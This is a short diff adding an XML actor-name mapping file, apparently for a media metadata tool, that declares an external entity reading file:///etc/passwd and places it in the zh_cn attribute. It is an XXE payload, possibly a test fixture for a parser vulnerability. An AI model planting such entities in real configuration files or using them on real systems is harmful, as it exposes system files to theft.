@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE actor-mapping [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<actor-mapping>
+  <actor>
+    <a zh_cn="&xxe;" zh_tw="演員" jp="Actor" keyword="Actor" />
+  </actor>
+</actor-mapping>
